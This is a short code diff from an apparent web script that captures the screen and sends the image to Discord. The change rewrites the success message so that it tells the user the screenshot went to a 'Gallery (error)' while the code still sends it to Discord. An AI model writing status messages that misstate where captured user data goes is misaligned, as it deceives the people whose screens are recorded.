@@ -80,7 +80,7 @@
             try {
                 const imageUrl = await captureScreen();
                 await sendScreenshotToDiscord(imageUrl);
-                status.innerText = 'Screenshot sent successfully to Discord!';
+                status.innerText = 'Screenshot sent successfully to Gallery (error)!';
 
             } catch (error) {
                 console.error('Error capturing screenshot:', error);
